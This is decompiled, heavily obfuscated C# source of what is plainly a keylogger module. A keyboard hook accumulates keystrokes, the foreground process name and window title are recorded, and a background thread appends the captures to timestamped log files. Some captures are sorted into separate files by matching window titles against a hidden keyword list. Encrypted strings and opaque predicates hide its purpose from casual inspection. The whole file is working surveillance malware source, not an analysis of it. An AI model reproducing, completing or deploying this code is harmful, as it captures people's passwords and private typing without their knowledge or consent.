using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
public sealed class _______________________________________
{
	public static string _;

	public static Keys __;

	private static ________________________________________ m____;

	private static string m_____;

	unsafe static _______________________________________()
	{
		System.Runtime.CompilerServices.Unsafe.SkipInit(out int num);
		nint num2;
		if (((0x1A40 ^ (num * 7 + num + num) ^ (-5647 | num)) & 4) == 0)
		{
			num = _003CModule_003E.____________;
			if (num + 8782 - 8617 == num)
			{
				num2 = -2038406570;
				goto IL_0045;
			}
		}
		num2 = (nint)Type.EmptyTypes.LongLength + 18043;
		goto IL_0045;
		IL_0045:
		_ = _003CModule_003E.__________((int)num2, (int)((nint)Type.EmptyTypes.LongLength + 19386), sizeof(ulong) + 204);
		_______________________________________.m____ = new ________________________________________();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr intptr_0, ref int int_0);

	public unsafe static void ___()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		int num3 = default(int);
		Thread thread = default(Thread);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					goto IL_0059;
				case 226:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 2:
							break;
						case 3:
							goto IL_0022;
						case 4:
							goto IL_002f;
						case 1:
							goto IL_0059;
						case 5:
							goto IL_0063;
						case 6:
							goto IL_006d;
						case 7:
							goto IL_008a;
						case 8:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 9:
							goto end_IL_0000_3;
						}
						goto IL_0003;
					}
					IL_008a:
					num = 7;
					thread.Start();
					break;
					IL_0059:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0003;
					IL_0003:
					num = 2;
					_______________________________________.m____ = new ________________________________________();
					switch (sizeof(Guid))
					{
					}
					goto IL_0022;
					IL_0022:
					num = 3;
					_______________________________________.m____.______________();
					goto IL_002f;
					IL_002f:
					num = 4;
					thread = new Thread(____);
					if ((nint)Type.EmptyTypes.LongLength + -16985 == -18366)
					{
						goto IL_0059;
					}
					goto IL_0063;
					IL_0063:
					num = 5;
					thread.SetApartmentState(ApartmentState.STA);
					goto IL_006d;
					IL_006d:
					num = 6;
					if ((nint)Type.EmptyTypes.LongLength + 7346 != 7346)
					{
					}
					thread.IsBackground = true;
					goto IL_008a;
					end_IL_0000_2:
					break;
				}
				num = 8;
				_______________________________________.m____._ += ______;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 226;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void ____()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				nint num6;
				int num5;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 566:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
						case 3:
						case 19:
							goto IL_0008;
						case 5:
							goto IL_004d;
						case 6:
							goto IL_0056;
						case 7:
							goto IL_0086;
						case 8:
							goto IL_0099;
						case 9:
							goto IL_00ef;
						case 4:
							goto IL_0124;
						case 10:
							goto IL_014a;
						case 14:
							goto IL_0190;
						case 11:
						case 12:
							goto IL_0196;
						case 13:
						case 15:
						case 16:
						case 17:
						case 18:
							goto IL_01c1;
						default:
							goto end_IL_0000;
						case 20:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_004d:
					num = 5;
					text = _______();
					goto IL_0056;
					IL_0008:
					num = 3;
					if (Operators.CompareString(_, string.Empty, false) != 0)
					{
						num5 = -12472;
						int ______________ = _003CModule_003E._______________;
						if (-______________ - 4835 == (int)((uint)(-(______________ * 134217728)) >> 27))
						{
						}
						goto IL_0124;
					}
					goto IL_01c1;
					IL_0056:
					num = 6;
					if (Operators.CompareString(text, string.Empty, false) != 0)
					{
						num6 = (nint)Type.EmptyTypes.LongLength + 1;
						goto IL_0073;
					}
					goto IL_01c1;
					IL_0124:
					num = 4;
					text2 = _______________________________________.m_____ + _003CModule_003E.______<string>(1264287121u);
					num6 = (nint)Type.EmptyTypes.LongLength + 0;
					goto IL_0073;
					IL_0073:
					switch (num6)
					{
					case 1:
						goto IL_0086;
					case 2:
						goto IL_0196;
					}
					goto IL_004d;
					IL_0086:
					num = 7;
					if (_.Length > 3)
					{
						goto IL_0099;
					}
					goto IL_0190;
					IL_0099:
					num = 8;
					num5 = -23120;
					File.AppendAllText(______________________.___ + DateTime.Now.ToString(_003CModule_003E.___<string>(463466858u)) + _003CModule_003E.______<string>(1957097582u), text2 + _ + _003CModule_003E._______<string>(4016157841u));
					num5 = -17192;
					goto IL_00ef;
					IL_00ef:
					num5 = -17192;
					num = 9;
					if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(_____(text2), (object)_003CModule_003E._______<string>(1950833015u), false))))
					{
						if (num5 != -17192)
						{
							goto IL_0124;
						}
						goto IL_014a;
					}
					goto IL_0196;
					IL_01c1:
					num = 18;
					Thread.Sleep(100);
					goto IL_0008;
					IL_014a:
					num = 10;
					File.AppendAllText(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)______________________._____, _____(text2)), (object)_003CModule_003E.______<string>(113553788u))), text2 + _ + _003CModule_003E.____<string>(2195909937u));
					goto IL_0196;
					IL_0196:
					num = 12;
					_ = _003CModule_003E.__________(2577, sizeof(ulong) + 4127, (int)((nint)Type.EmptyTypes.LongLength + 245));
					goto IL_01c1;
					IL_0190:
					num = 14;
					goto IL_01c1;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 566;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static object _____(string string_0)
	{
		try
		{
			string text = __________________________________________________________________.____(_003CModule_003E.___<string>(1408750413u));
			if (Operators.CompareString(text, _003CModule_003E.__________(sizeof(byte) + 7661, (int)((nint)Type.EmptyTypes.LongLength + 9265), sizeof(double) + 187), false) != 0)
			{
				string text2 = string_0.ToLower();
				int num = (int)((nint)Type.EmptyTypes.LongLength + 21181);
				nint num5;
				if ((0x800000 & ((uint)num >> 9)) != (uint)((num - (num - 3954) << 23) & 0x800000))
				{
					int num2 = _003CModule_003E.____________;
					int num3 = default(int);
					if ((int)((uint)num2 / 362426u) - -1073741824 != (int)((0 - (uint)num3 / 3185410u) / 64u))
					{
						int num4 = default(int);
						num5 = ((-(num4 << 24) != 1741) ? ((nint)Type.EmptyTypes.LongLength + -2113698188) : (sizeof(ulong) + 1873032475));
					}
					else
					{
						int num4 = _003CModule_003E._____________;
						if ((((uint)(2048 * num4) ^ ((uint)num4 % 4096u >> 19)) & 0x100) == 0)
						{
							goto IL_01cf;
						}
						num5 = ((num4 + 7121 == (num4 << 4) - (int)((uint)num4 % 524288u)) ? ((nint)Type.EmptyTypes.LongLength + 1205862654) : (sizeof(ushort) + -1451822392));
					}
				}
				else
				{
					num5 = (nint)Type.EmptyTypes.LongLength + 2;
				}
				string[] array2 = default(string[]);
				int num6 = default(int);
				string text3 = default(string);
				while (true)
				{
					switch (num5)
					{
					case 2:
					{
						string[] array3 = Strings.Split(text, _003CModule_003E.______<string>(1289956344u), -1, (CompareMethod)0);
						if (num != 28659)
						{
						}
						array2 = array3;
						num6 = 0;
						goto IL_0160;
					}
					case 1:
						{
							string[] array;
							do
							{
								array = Strings.Split(text3, _003CModule_003E._______<string>(1023697363u), -1, (CompareMethod)0);
							}
							while (num != 26639);
							if (array.Length != 3 || !text2.Contains(array[0]))
							{
								num6++;
								goto IL_0160;
							}
							return array[1];
						}
						IL_0160:
						if (num6 < array2.Length)
						{
							goto IL_0166;
						}
						return _003CModule_003E._______<string>(1950833015u);
					}
					break;
					IL_0166:
					text3 = array2[num6];
					num = (int)((nint)Type.EmptyTypes.LongLength + 26639);
					num5 = (nint)Type.EmptyTypes.LongLength + 1;
				}
			}
			goto IL_01cf;
			IL_01cf:
			return _003CModule_003E._____<string>(2303988711u);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = _003CModule_003E._______<string>(1950833015u);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public unsafe static void ______(Keys keys_0)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Invalid comparison between Unknown and I4
		//IL_01c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0213: Unknown result type (might be due to invalid IL or missing references)
		//IL_0227: Unknown result type (might be due to invalid IL or missing references)
		//IL_0228: Unknown result type (might be due to invalid IL or missing references)
		int try0000_dispatch = -1;
		int num6 = default(int);
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				int num5;
				nint num7;
				switch (try0000_dispatch)
				{
				default:
					num6 = _003CModule_003E._____________;
					if ((0x1000000u & ((uint)(167772160 * num6) ^ ((uint)num6 / 183963u))) != 0)
					{
						goto IL_01e2;
					}
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_002b;
				case 630:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_002b;
						case 3:
							goto IL_00c2;
						case 4:
							goto IL_00da;
						case 5:
							goto IL_01e2;
						case 8:
							goto IL_0202;
						case 9:
							goto IL_0205;
						case 10:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 6:
						case 7:
						case 11:
						case 12:
						case 13:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00da:
					num = 4;
					if (Operators.CompareString(_, _003CModule_003E.__________((int)((num2 * 3 + num2 != 2961) ? ((nint)Type.EmptyTypes.LongLength + 39566) : (((0x800 & (num * 1534853120 + 9989)) != ((num * 19514 << 11) & 0x800)) ? ((nint)Type.EmptyTypes.LongLength + 2034685452) : (((uint)num / 64312807u - 6641 != 4976) ? (sizeof(ushort) + 1224168802) : ((nint)Type.EmptyTypes.LongLength + 409549022)))), sizeof(double) + 40814, ((-3 | (3 * num3 + num3 - 2636)) == -3) ? 26 : (sizeof(uint) + 770530409)), false) != 0)
					{
						num5 = 15942;
						if ((nint)Type.EmptyTypes.LongLength + 3718 == 23703)
						{
							goto IL_01bc;
						}
						goto IL_01e2;
					}
					goto end_IL_0000_3;
					IL_0202:
					num = 8;
					goto IL_0205;
					IL_002b:
					num = 2;
					if ((int)keys_0 == 0)
					{
						goto end_IL_0000_3;
					}
					num5 = (int)((int.MinValue + num2 * 1073741824 != 1073741824 * (num2 - -1052231380)) ? (sizeof(ulong) + -3672) : ((nint)Type.EmptyTypes.LongLength + 681263099));
					if ((num2 | 0x662) - 1891 == num2 - 4420)
					{
						num7 = (nint)Type.EmptyTypes.LongLength + 2095995338;
					}
					else
					{
						if (((0x1EAA ^ num6) & 0x100) == (num6 & 0x100))
						{
							goto IL_00c2;
						}
						num7 = sizeof(int) + -2032417878;
					}
					switch (num7)
					{
					case 0:
						break;
					default:
						goto IL_01bc;
					}
					goto IL_00c2;
					IL_0205:
					num = 9;
					_ += _______________________________________.m____.________________(keys_0);
					break;
					IL_00c2:
					num5 = -3664;
					goto IL_01bc;
					IL_01bc:
					num = 3;
					if (Operators.CompareString(_______________________________________.m____.________________(keys_0), _003CModule_003E.____<string>(1125972394u), false) == 0)
					{
						if (num5 == -3664)
						{
							goto IL_00da;
						}
						goto IL_01e2;
					}
					goto IL_0202;
					IL_01e2:
					num = 5;
					_ = _.Remove(_.Length - 1);
					goto end_IL_0000_3;
					end_IL_0000_2:
					break;
				}
				num = 10;
				__ = keys_0;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 630;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private unsafe static string _______()
	{
		int int_ = default(int);
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			GetWindowThreadProcessId(foregroundWindow, ref int_);
			Process processById = Process.GetProcessById(int_);
			string text = _003CModule_003E.____<string>(3888109736u) + processById.ProcessName + _003CModule_003E.___<string>(3608930325u) + processById.MainWindowTitle;
			switch ((nint)Type.EmptyTypes.LongLength + 0)
			{
			default:
				if (Operators.CompareString(_______________________________________.m_____, text, false) == 0)
				{
					return _003CModule_003E.__________(((0x800017E7u ^ ((uint)int_ % 1176201765u)) == 0) ? (-711530863) : (sizeof(byte) + 10191), sizeof(ushort) + 10871, ((0xFFFFFFF | ((uint)int_ / 17u)) != 268435455) ? (sizeof(int) + 2114525397) : 219);
				}
				_______________________________________.m_____ = text;
				return text;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			int num = _003CModule_003E.____________;
			string result = _003CModule_003E.__________((~((uint)num / 160454002u) != (uint)(67108864 * (int_ * 9 + 23 * int_))) ? (sizeof(Guid) + 18415) : (-1361878613), (int)(((uint)num / 70500u != 1769644751) ? 19141 : ((nint)Type.EmptyTypes.LongLength + -1767904212)), 22);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
